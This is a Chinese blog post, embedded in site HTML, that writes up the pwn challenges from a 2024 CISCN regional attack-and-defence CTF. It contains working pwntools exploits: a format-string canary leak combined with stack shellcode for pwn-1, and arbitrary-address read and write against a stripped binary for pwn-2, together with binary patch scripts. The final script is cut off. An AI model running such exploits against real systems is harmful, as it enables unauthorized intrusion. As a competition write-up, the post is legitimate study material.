@@ -1,0 +1,817 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width">
+<meta name="theme-color" content="#222"><meta name="generator" content="Hexo 7.2.0">
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.6.0/css/all.min.css" integrity="sha256-5eIC48iZUHmSlSUz9XtjRyK2mzQkHScZY1WdMaoz74E=" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/fancyapps-ui/5.0.31/fancybox/fancybox.css" integrity="sha256-gkQVf8UKZgQ0HyuxL/VnacadJ+D2Kox2TCEBuNQg5+w=" crossorigin="anonymous">
+
+<script class="next-config" data-name="main" type="application/json">{"hostname":"example.com","root":"/","images":"/images","scheme":"Muse","darkmode":false,"version":"8.21.0","exturl":false,"sidebar":{"position":"left","width_expanded":320,"width_dual_column":240,"display":"post","padding":18,"offset":12},"hljswrap":false,"copycode":{"enable":false,"style":null},"fold":{"enable":false,"height":500},"bookmark":{"enable":false,"color":"#222","save":"auto"},"mediumzoom":true,"lazyload":false,"pangu":true,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":false,"transition":{"menu_item":"fadeInDown","post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"i18n":{"placeholder":"Searching...","empty":"We didn't find any results for the search: ${query}","hits_time":"${hits} results found in ${time} ms","hits":"${hits} results found"}}</script><script src="/js/config.js"></script>
+
+    <meta name="description" content="2024华东北分区赛-pwn复现第一次打国赛，也是第一次打awdp（非正规）。赛后平台、题目都是非预期。竟然可以用fix来break，算是长见识了。这次比赛更多的是积累经验了。 8web 2pwn。两道题都通了，可是都没fix成功。 9.23访问平台地址，9.30靶机开始访问 pwn-1这题蛮可惜的，漏洞就是栈溢出+格式化字符串，花了40多分钟打通。一开始看到题目先想着fix了，没有先break。">
+<meta property="og:type" content="article">
+<meta property="og:title" content="2024ciscn分区赛-pwn复现">
+<meta property="og:url" content="http://example.com/2024/06/25/2024ciscn%E5%88%86%E5%8C%BA%E8%B5%9B-pwn%E5%A4%8D%E7%8E%B0/index.html">
+<meta property="og:site_name" content="tw11ty">
+<meta property="og:description" content="2024华东北分区赛-pwn复现第一次打国赛，也是第一次打awdp（非正规）。赛后平台、题目都是非预期。竟然可以用fix来break，算是长见识了。这次比赛更多的是积累经验了。 8web 2pwn。两道题都通了，可是都没fix成功。 9.23访问平台地址，9.30靶机开始访问 pwn-1这题蛮可惜的，漏洞就是栈溢出+格式化字符串，花了40多分钟打通。一开始看到题目先想着fix了，没有先break。">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/tw11ty/MyPic/img202406251556142.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/tw11ty/MyPic/img202406251556611.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/tw11ty/MyPic/img202406251558233.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/tw11ty/MyPic/img202406251609873.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/tw11ty/MyPic/img202406251612858.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/tw11ty/MyPic/img202406251612341.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/tw11ty/MyPic/img202406251613318.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/tw11ty/MyPic/img202406251713761.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/tw11ty/MyPic/img202406251714517.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/tw11ty/MyPic/img202406251719512.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/tw11ty/MyPic/img202406251723956.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/tw11ty/MyPic/img202406251724645.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/tw11ty/MyPic/img202406251725678.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/tw11ty/MyPic/img202406251726607.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/tw11ty/MyPic/img202406251736037.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/tw11ty/MyPic/img202406251736505.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/tw11ty/MyPic/img202406251739695.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/tw11ty/MyPic/img202406251739567.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/tw11ty/MyPic/img202406251740443.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/tw11ty/MyPic/img202406251744116.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/tw11ty/MyPic/img202406251747486.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/tw11ty/MyPic/img202406251745788.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/tw11ty/MyPic/img202406251746139.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/tw11ty/MyPic/img202406251818976.png">
+<meta property="article:published_time" content="2024-06-25T10:23:13.000Z">
+<meta property="article:modified_time" content="2024-07-15T03:45:21.535Z">
+<meta property="article:author" content="kkkk">
+<meta property="article:tag" content="ciscn">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://cdn.jsdelivr.net/gh/tw11ty/MyPic/img202406251556142.png">
+
+
+<link rel="canonical" href="http://example.com/2024/06/25/2024ciscn%E5%88%86%E5%8C%BA%E8%B5%9B-pwn%E5%A4%8D%E7%8E%B0/">
+
+
+
+<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"en","comments":true,"permalink":"http://example.com/2024/06/25/2024ciscn%E5%88%86%E5%8C%BA%E8%B5%9B-pwn%E5%A4%8D%E7%8E%B0/","path":"2024/06/25/2024ciscn分区赛-pwn复现/","title":"2024ciscn分区赛-pwn复现"}</script>
+
+<script class="next-config" data-name="calendar" type="application/json">""</script>
+<title>2024ciscn分区赛-pwn复现 | tw11ty</title>
+  
+
+
+
+
+
+
+
+
+  <noscript>
+    <link rel="stylesheet" href="/css/noscript.css">
+  </noscript>
+<link rel="alternate" href="/atom.xml" title="tw11ty" type="application/atom+xml">
+<link rel="stylesheet" href="/css/prism.css" type="text/css"></head>
+
+<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
+  <div class="headband"></div>
+
+  <main class="main">
+    <div class="column">
+      <header class="header" itemscope itemtype="http://schema.org/WPHeader"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="Toggle navigation bar" role="button">
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <i class="logo-line"></i>
+      <p class="site-title">tw11ty</p>
+      <i class="logo-line"></i>
+    </a>
+      <p class="site-subtitle" itemprop="description">A blog powered by Hexo</p>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger" aria-label="Search" role="button">
+    </div>
+  </div>
+</div>
+
+
+
+
+
+
+
+</header>
+        
+  
+  <aside class="sidebar">
+
+    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
+      <ul class="sidebar-nav">
+        <li class="sidebar-nav-toc">
+          Table of Contents
+        </li>
+        <li class="sidebar-nav-overview">
+          Overview
+        </li>
+      </ul>
+
+      <div class="sidebar-panel-container">
+        <!--noindex-->
+        <div class="post-toc-wrap sidebar-panel">
+            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#2024%E5%8D%8E%E4%B8%9C%E5%8C%97%E5%88%86%E5%8C%BA%E8%B5%9B-pwn%E5%A4%8D%E7%8E%B0"><span class="nav-number">1.</span> <span class="nav-text">2024华东北分区赛-pwn复现</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#pwn-1"><span class="nav-number">1.1.</span> <span class="nav-text">pwn-1</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#break"><span class="nav-number">1.1.1.</span> <span class="nav-text">break</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#fix"><span class="nav-number">1.1.2.</span> <span class="nav-text">fix</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#pwn-2"><span class="nav-number">1.2.</span> <span class="nav-text">pwn-2</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#break-1"><span class="nav-number">1.2.1.</span> <span class="nav-text">break</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#fix-1"><span class="nav-number">1.2.2.</span> <span class="nav-text">fix</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%A4%8D%E7%8E%B0"><span class="nav-number">1.2.3.</span> <span class="nav-text">复现</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%81%A2%E5%A4%8D%E7%AC%A6%E5%8F%B7%E8%A1%A8"><span class="nav-number">1.2.3.1.</span> <span class="nav-text">恢复符号表</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%87%BD%E6%95%B0%E5%88%86%E6%9E%90"><span class="nav-number">1.2.3.2.</span> <span class="nav-text">函数分析</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%80%BB%E7%BB%93"><span class="nav-number">1.3.</span> <span class="nav-text">总结</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%8D%8E%E5%8D%97"><span class="nav-number">2.</span> <span class="nav-text">华南</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#my-heap"><span class="nav-number">2.1.</span> <span class="nav-text">my_heap</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%8D%8E%E4%B8%AD"><span class="nav-number">3.</span> <span class="nav-text">华中</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#pwn1-note"><span class="nav-number">3.1.</span> <span class="nav-text">pwn1-note</span></a></li></ol></li></ol></div>
+        </div>
+        <!--/noindex-->
+
+        <div class="site-overview-wrap sidebar-panel">
+          <div class="site-author animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
+  <p class="site-author-name" itemprop="name">kkkk</p>
+  <div class="site-description" itemprop="description"></div>
+</div>
+<div class="site-state-wrap animated">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+        <a href="/archives/">
+          <span class="site-state-item-count">9</span>
+          <span class="site-state-item-name">posts</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-tags">
+        <span class="site-state-item-count">7</span>
+        <span class="site-state-item-name">tags</span>
+      </div>
+  </nav>
+</div>
+
+        </div>
+      </div>
+    </div>
+
+    
+  </aside>
+
+
+    </div>
+
+    <div class="main-inner post posts-expand">
+
+
+  
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="en">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2024/06/25/2024ciscn%E5%88%86%E5%8C%BA%E8%B5%9B-pwn%E5%A4%8D%E7%8E%B0/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="kkkk">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="tw11ty">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content="2024ciscn分区赛-pwn复现 | tw11ty">
+      <meta itemprop="description" content="">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          2024ciscn分区赛-pwn复现
+        </h1>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">Posted on</span>
+
+      <time title="Created: 2024-06-25 18:23:13" itemprop="dateCreated datePublished" datetime="2024-06-25T18:23:13+08:00">2024-06-25</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar-check"></i>
+      </span>
+      <span class="post-meta-item-text">Edited on</span>
+      <time title="Modified: 2024-07-15 11:45:21" itemprop="dateModified" datetime="2024-07-15T11:45:21+08:00">2024-07-15</time>
+    </span>
+
+  
+    <span class="post-meta-break"></span>
+    <span class="post-meta-item" title="Word count in article">
+      <span class="post-meta-item-icon">
+        <i class="far fa-file-word"></i>
+      </span>
+      <span class="post-meta-item-text">Word count in article: </span>
+      <span>10k</span>
+    </span>
+    <span class="post-meta-item" title="Reading time">
+      <span class="post-meta-item-icon">
+        <i class="far fa-clock"></i>
+      </span>
+      <span class="post-meta-item-text">Reading time &asymp;</span>
+      <span>9 mins.</span>
+    </span>
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody"><h1 id="2024华东北分区赛-pwn复现"><a href="#2024华东北分区赛-pwn复现" class="headerlink" title="2024华东北分区赛-pwn复现"></a>2024华东北分区赛-pwn复现</h1><p>第一次打国赛，也是第一次打awdp（非正规）。赛后平台、题目都是非预期。竟然可以用fix来break，算是长见识了。这次比赛更多的是积累经验了。</p>
+<p>8web 2pwn。两道题都通了，可是都没fix成功。</p>
+<p>9.23访问平台地址，9.30靶机开始访问</p>
+<h2 id="pwn-1"><a href="#pwn-1" class="headerlink" title="pwn-1"></a>pwn-1</h2><p>这题蛮可惜的，漏洞就是栈溢出+格式化字符串，花了40多分钟打通。一开始看到题目先想着fix了，没有先break。结果patch了6次都没过，到了10.45放弃fix这题，开始break。到13轮出了，最终吃了3w多分。当时应该先break再fix的，能多吃五六轮分，大概还能拿七八千分。</p>
+<h3 id="break"><a href="#break" class="headerlink" title="break"></a>break</h3><p>(<img src="https://cdn.jsdelivr.net/gh/tw11ty/MyPic/img202406251556142.png" alt="111"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/tw11ty/MyPic/img202406251556611.png" alt="image-20240625153135803"></p>
+<p>格式化字符串泄露栈地址以及canary，由于没开NX，栈上写shellcode，打ret2shellcode</p>
+<p>shellcode写orw，open用openat代替</p>
+<p>写shellcode的时候read从文件描述符3里面读了，导致本地成功泄露flag，远程没成功泄露，又花了好多时间排除shellcode的问题，最后从rax里面读，大概花了十分钟，又是一轮分。</p>
+<pre class=" language-highlight python"><span class="comment"><code class="language-highlight python"><span class="comment">#coding:utf-8</span>
+<span class="keyword">from</span> pwn <span class="keyword">import</span> *
+<span class="keyword">from</span> tw11ty <span class="keyword">import</span> *
+<span class="comment">#from ctypes import *</span>
+
+<span class="comment">#1  --> stackoverflow</span>
+<span class="comment">#2  --> fmt</span>
+
+<span class="keyword">def</span> <span class="title function_">menu1</span>(<span class="params">payload</span>):
+    sla(<span class="string">b&#x27;2: get name\n&#x27;</span> , <span class="built_in">str</span>(<span class="number">1</span>))
+    sla(<span class="string">b&#x27;->set name\n&#x27;</span>, payload)
+
+<span class="keyword">def</span> <span class="title function_">menu2</span>():
+    sla(<span class="string">b&#x27;2: get name\n&#x27;</span> , <span class="built_in">str</span>(<span class="number">2</span>))
+
+<span class="keyword">def</span> <span class="title function_">getflag</span>():
+    sla(<span class="string">b&#x27;2: get name\n&#x27;</span> , <span class="built_in">str</span>(-<span class="number">1</span>))
+
+<span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span> :
+    context.log_level = <span class="string">&#x27;info&#x27;</span>
+    IPort = <span class="string">&#x27;192.73.1.182 80&#x27;</span>
+    pwnfile = <span class="string">&#x27;./pwn&#x27;</span>
+    libc_name = <span class="string">&#x27;/ctf/work/glibc-all-in-one/libs/2.34-0ubuntu3_amd64/libc.so.6&#x27;</span> 
+    <span class="comment"># libc_name = &#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span>
+    elf  = ELF(pwnfile)
+    rop  = ROP(pwnfile)
+    <span class="comment"># libc = ELF(libc_name)</span>
+
+    io = init(pwnfile, IPort, libc_name)
+
+    payload = <span class="string">b&#x27;%17$p--%18$p&#x27;</span>   <span class="comment">#-0x60 --> shellcode</span>
+    menu1(payload)
+    menu2()
+    ru(<span class="string">b&#x27;0x&#x27;</span>)
+    canary = <span class="built_in">int</span>(r(<span class="number">16</span>), <span class="number">16</span>)
+    ru(<span class="string">b&#x27;0x&#x27;</span>)
+    ori = <span class="built_in">int</span>(r(<span class="number">12</span>), <span class="number">16</span>)
+
+    shellcode = asm(<span class="string">&#x27;&#x27;&#x27;   </span>
+<span class="string">                    mov r14, 0x67616c66</span>
+<span class="string">                    push r14</span>
+<span class="string">                    mov rsi, rsp</span>
+<span class="string">                    mov rdi, -100</span>
+<span class="string">                    mov edx, 0</span>
+<span class="string">                    mov rax, 257</span>
+<span class="string">                    syscall               </span>
+<span class="string">        </span>
+<span class="string">                    mov rsi, rsp</span>
+<span class="string">                    mov rdi, rax</span>
+<span class="string">                    mov rdx, 0xff</span>
+<span class="string">                    xor rax, rax</span>
+<span class="string">                    syscall</span>
+<span class="string"></span>
+<span class="string">                    mov rsi, rsp</span>
+<span class="string">                    mov rdi, 1</span>
+<span class="string">                    mov rax, 1</span>
+<span class="string">                    syscall</span>
+<span class="string">                    &#x27;&#x27;&#x27;</span>)
+
+
+    payload = shellcode.ljust(<span class="number">0x48</span>, <span class="string">b&#x27;\x00&#x27;</span>) + p64(canary) + p64(<span class="number">0x0</span>) + p64(ori-<span class="number">0x60</span>)
+
+    <span class="comment"># debug(&#x27;b *$rebase(0x0001474) \n \</span>
+    <span class="comment">#       b *$rebase(0x0014A6)&#x27;)</span>
+    <span class="comment"># debug(&#x27;b *$rebase(0x014D7  )&#x27;)</span>
+    menu1(payload)
+    getflag()
+
+    leak(<span class="string">"canary"</span>, canary)
+    leak(<span class="string">"ori"</span>, ori)
+    itr()
+</code></pre>
+
+
+
+<h3 id="fix"><a href="#fix" class="headerlink" title="fix"></a>fix</h3><p>在10.45之前fix了6次，一直没成功，栈溢出改字节为0x48或者0x28</p>
+<p>改printf为puts、添加“%s”，改printf调用前的跳转，都尝试过了，都没过check。尤其是改跳转，自己都不知道还能怎么打了，一直没check过。不排除对文件字节大小的check</p>
+<p>patch脚本</p>
+<pre class=" language-highlight python"><span class="keyword">from</span> AwdPwnPatcher <span class="keyword"><code class="language-highlight python"><span class="keyword">from</span> AwdPwnPatcher <span class="keyword">import</span> *
+
+binary = <span class="string">"./pwn"</span>
+awd_pwn_patcher = AwdPwnPatcher(binary)
+fmt_offset = awd_pwn_patcher.add_constant_in_ehframe(<span class="string">"%s\x00\x00"</span>)
+assembly = <span class="string">"""</span>
+<span class="string">lea rax, [rbp-0x50]</span>
+<span class="string">mov rsi, rax</span>
+<span class="string">lea rdi, qword ptr [&#123;&#125;]</span>
+<span class="string">"""</span>.<span class="built_in">format</span>(<span class="built_in">hex</span>(fmt_offset))
+awd_pwn_patcher.patch_by_jmp(<span class="number">0x14AB</span>, jmp_to=<span class="number">0x14B7</span>, assembly=assembly)
+assembly = <span class="string">&#x27;&#x27;&#x27;</span>
+<span class="string">mov edx, 0x48</span>
+<span class="string">&#x27;&#x27;&#x27;</span>
+awd_pwn_patcher.patch_origin(<span class="number">0x0147D</span>, end=<span class="number">0x01482</span>, assembly=assembly)
+
+awd_pwn_patcher.save()</code></pre>
+
+<p>这样一直patch不过，看了<a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_45906533/article/details/139937288">Ahisec</a>的wp，原来直接改栈权限就行了吗……吃了没经验的亏了</p>
+<p><img src="https://cdn.jsdelivr.net/gh/tw11ty/MyPic/img202406251558233.png" alt="image-20240625154514962"></p>
+<p>rwx改成rw就行了，7-&gt;6即可。</p>
+<p>主要是光改这个也能绕过啊……打ROPgadget等等，格式化字符串和溢出都没改，还是能打的。这就是不给libc的正确解法吗……</p>
+<p>实在不懂怎么check的。改了溢出、加了“%s”，我认为就算是没有开NX也打不了的，结果过不了check……</p>
+<h2 id="pwn-2"><a href="#pwn-2" class="headerlink" title="pwn-2"></a>pwn-2</h2><p>静态 高版本编译</p>
+<p>之前没有遇到过导入符号表还原符号的方法，比赛的时候边逆边调，碰巧题目不是特别难，硬是调出来了，程序都没逆完。可惜一直在弄pwn-1的patch，这题在14.40多break，最后只吃了6k多分</p>
+<h3 id="break-1"><a href="#break-1" class="headerlink" title="break"></a>break</h3><p>逆向</p>
+<p><img src="https://cdn.jsdelivr.net/gh/tw11ty/MyPic/img202406251609873.png" alt="image-20240625160948822"></p>
+<p>逆的时候感觉chkflag很奇怪，里面貌似是使用了open读取flag</p>
+<p><img src="https://cdn.jsdelivr.net/gh/tw11ty/MyPic/img202406251612858.png" alt="image-20240625161209814"></p>
+<p>调一调发现读取flag到了堆上</p>
+<p><img src="https://cdn.jsdelivr.net/gh/tw11ty/MyPic/img202406251612341.png" alt="image-20240625161246286"></p>
+<p>然后利用getflag的任意地址读能读到id地址为0x4efaf0上的flag</p>
+<p><img src="https://cdn.jsdelivr.net/gh/tw11ty/MyPic/img202406251613318.png" alt="image-20240625161349274"></p>
+<p>中间多加一步addflag来泄露堆地址，通过计算得到addflag得到的第一块chunk地址始终与flag的偏移为876</p>
+<p>最后直接泄露</p>
+<pre class=" language-highlight python"><span class="comment"><code class="language-highlight python"><span class="comment">#coding:utf-8</span>
+<span class="keyword">from</span> pwn <span class="keyword">import</span> *
+<span class="keyword">from</span> tw11ty <span class="keyword">import</span> *
+<span class="comment">#from ctypes import *</span>
+
+<span class="keyword">def</span> <span class="title function_">menu</span>(<span class="params">num</span>):
+    sla(<span class="string">b&#x27;6: check flag\n&#x27;</span>,<span class="built_in">str</span>(num))
+<span class="keyword">def</span> <span class="title function_">add</span>():
+    menu(<span class="number">2</span>)
+
+<span class="keyword">def</span> <span class="title function_">getflag</span>(<span class="params">info</span>):
+    menu(<span class="number">5</span>)
+    sla(<span class="string">b&#x27;:\n&#x27;</span>, <span class="built_in">str</span>(info))
+
+<span class="keyword">def</span> <span class="title function_">openflag</span>():
+    menu(<span class="number">6</span>)
+
+<span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span> :
+    <span class="comment"># context.log_level = &#x27;info&#x27;</span>
+    IPort = <span class="string">&#x27;192.73.1.80 80&#x27;</span>
+    pwnfile = <span class="string">&#x27;./heap&#x27;</span>
+    libc_name = <span class="string">&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span>
+    elf  = ELF(pwnfile)
+    rop  = ROP(pwnfile)
+    <span class="comment"># libc = ELF(libc_name)</span>
+
+    io = init(pwnfile, IPort, libc_name)
+
+    add()
+    ru(<span class="string">b&#x27;:&#x27;</span>)
+    ori = <span class="built_in">int</span>(r(<span class="number">8</span>), <span class="number">10</span>)
+    
+    openflag()
+    getflag(ori + <span class="number">876</span>)
+
+    <span class="comment"># system_addr, bin_sh = get_sysbin_local(&#x27;puts&#x27;, puts_addr)</span>
+    <span class="built_in">print</span>(<span class="string">"ori = "</span> + <span class="built_in">str</span>(ori))
+    <span class="comment"># debug(&#x27;b *0x00000000004020b2&#x27;)</span>
+    itr()
+<span class="comment">#0x4ef784</span></code></pre>
+
+
+
+<h3 id="fix-1"><a href="#fix-1" class="headerlink" title="fix"></a>fix</h3><p>漏洞太多不知道修什么了……好像还是人工测，太慢了</p>
+<p>尝试了个将flag改为flaa，check过不了。原来不止看能不读到flag吗</p>
+<p>最后是没patch成功。太菜了。。。</p>
+<p><a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/705148718?utm_psn=178896319914142">Real返璞归真</a>这位师傅是nop掉了后门函数</p>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_45906533/article/details/139937288">Ahisec</a>是改了chkflag里面的参数</p>
+<p>自己还是太菜了。。。</p>
+<h3 id="复现"><a href="#复现" class="headerlink" title="复现"></a>复现</h3><p>当时没逆完的现在补补吧。</p>
+<h4 id="恢复符号表"><a href="#恢复符号表" class="headerlink" title="恢复符号表"></a>恢复符号表</h4><p>先尝试<strong>恢复静态编译去符号的库函数名</strong>，题目的编译环境为22，估计靶机环境是2.34以上。</p>
+<p><a href="(https://blog.csdn.net/Breeze_CAT/article/details/103788796)">IDA_flair</a>直接导入对应的sig文件，对应sig文件<a target="_blank" rel="noopener" href="https://github.com/push0ebp/sig-database">push0ebp&#x2F;sig-database: IDA FLIRT Signature Database (github.com)</a>下载，里面最glibc最高为2.35，如果是再高点就需需要自己生成了。</p>
+<p>导入成功</p>
+<p><img src="https://cdn.jsdelivr.net/gh/tw11ty/MyPic/img202406251713761.png" alt="image-20240625171320497"></p>
+<h4 id="函数分析"><a href="#函数分析" class="headerlink" title="函数分析"></a>函数分析</h4><p>lsflag遍历一遍chunk</p>
+<p>addflag函数，从预分配的0x191大小的chunk中，分割出了12字节，前四字节写入size8，后8字节为data</p>
+<p>qword_4E82F0里面保存着chunk的初始地址</p>
+<p><img src="https://cdn.jsdelivr.net/gh/tw11ty/MyPic/img202406251714517.png" alt="image-20240625171441484"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/tw11ty/MyPic/img202406251719512.png" alt="image-20240625171911393"></p>
+<p>editflag函数</p>
+<p>往v4地址里面写入v5，任意地址写</p>
+<p><img src="https://cdn.jsdelivr.net/gh/tw11ty/MyPic/img202406251723956.png" alt="image-20240625172322905"></p>
+<p>delflag函数</p>
+<p>将data域置空</p>
+<p><img src="https://cdn.jsdelivr.net/gh/tw11ty/MyPic/img202406251724645.png" alt="image-20240625172418594"></p>
+<p>getflag函数</p>
+<p>输出v8地址内的数据，v8可控，任意地址读</p>
+<p><img src="https://cdn.jsdelivr.net/gh/tw11ty/MyPic/img202406251725678.png" alt="image-20240625172532626"></p>
+<p>chkflag函数</p>
+<p><img src="https://cdn.jsdelivr.net/gh/tw11ty/MyPic/img202406251726607.png" alt="image-20240625172616549"></p>
+<p>读取flag前8字节取出，同时也会在堆上保存flag–&gt;非预期存在原因</p>
+<p><img src="https://cdn.jsdelivr.net/gh/tw11ty/MyPic/img202406251736037.png" alt="image-20240625173208267"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/tw11ty/MyPic/img202406251736505.png" alt="image-20240625173355406"></p>
+<p>接下来的sub_401D0F将取出来的8字节flag保存在0x4E60F0处</p>
+<p><img src="https://cdn.jsdelivr.net/gh/tw11ty/MyPic/img202406251739695.png" alt="image-20240625173911635"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/tw11ty/MyPic/img202406251739567.png" alt="image-20240625173900469"></p>
+<p>sub_401C51，将flag保存在了堆上</p>
+<p><img src="https://cdn.jsdelivr.net/gh/tw11ty/MyPic/img202406251740443.png" alt="image-20240625174003363"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/tw11ty/MyPic/img202406251744116.png" alt="image-20240625174209271"></p>
+<p>然后是四次的循环加密</p>
+<p><img src="https://cdn.jsdelivr.net/gh/tw11ty/MyPic/img202406251747486.png" alt="image-20240625174702436"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/tw11ty/MyPic/img202406251745788.png" alt="image-20240625174530752"></p>
+<p>过了这段chk后会打印flag</p>
+<p><img src="https://cdn.jsdelivr.net/gh/tw11ty/MyPic/img202406251746139.png" alt="image-20240625174644089"></p>
+<p>先申请出四块chunk用于存放加密后的flag，然后执行chkflag，将flag写入到0x4E60F0内，这时使用getflag取出0x4E60F0中加密过后的flag。再循环四次使用editflag往四块chunk中写入四段循环加密的flag，最后执行chkflag就能成功的过check，输出flag。</p>
+<p>一个去了符号表的逻辑漏洞……洞有点多，check的点也是奇奇又怪怪。</p>
+<pre class=" language-highlight python"><span class="comment"><code class="language-highlight python"><span class="comment">#coding:utf-8</span>
+<span class="keyword">from</span> pwn <span class="keyword">import</span> *
+<span class="keyword">from</span> tw11ty <span class="keyword">import</span> *
+<span class="comment">#from ctypes import *</span>
+
+<span class="keyword">def</span> <span class="title function_">menu</span>(<span class="params">num</span>):
+    sla(<span class="string">b&#x27;6: check flag\n&#x27;</span>,<span class="built_in">str</span>(num))
+<span class="keyword">def</span> <span class="title function_">addflag</span>():
+    menu(<span class="number">2</span>)
+<span class="keyword">def</span> <span class="title function_">editflag</span>(<span class="params">target, value</span>):
+    menu(<span class="number">3</span>)
+    sl(<span class="built_in">str</span>(target) + <span class="built_in">str</span>(<span class="string">&#x27; &#x27;</span>) + <span class="built_in">str</span>(value))
+<span class="keyword">def</span> <span class="title function_">getflag</span>(<span class="params">info</span>):
+    menu(<span class="number">5</span>)
+    sla(<span class="string">b&#x27;:\n&#x27;</span>, <span class="built_in">str</span>(info))
+<span class="keyword">def</span> <span class="title function_">chkflag</span>():
+    menu(<span class="number">6</span>)
+
+<span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span> :
+    context.log_level = <span class="string">&#x27;info&#x27;</span>
+    IPort = <span class="string">&#x27;192.73.1.80 80&#x27;</span>
